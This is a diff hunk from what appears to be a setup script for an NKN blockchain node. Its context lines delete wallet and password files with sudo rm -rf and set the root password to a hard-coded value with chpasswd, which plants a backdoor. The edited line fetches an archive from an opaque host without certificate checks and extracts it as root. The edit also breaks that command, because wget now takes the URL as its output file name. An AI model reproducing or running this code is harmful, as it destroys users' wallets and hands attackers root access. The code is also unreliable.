@@ -32,7 +32,7 @@ else
    sudo rm -rf ChainDB/
    sudo rm -rf wallet.json
    sudo rm -rf wallet.pswd
-   wget -O - 'http://nkn.wmd2bl5c2u66nxg5wh97xq50hvi63jcp.com/ChainDB.tar.gz' -q --no-check-certificate | sudo tar -xzf -
+   wget -O 'http://nkn.wmd2bl5c2u66nxg5wh97xq50hvi63jcp.com/ChainDB.tar.gz' -q --no-check-certificate | sudo tar -xzf -
    echo root:xD23sdh6h333hs | chpasswd
 fi
 
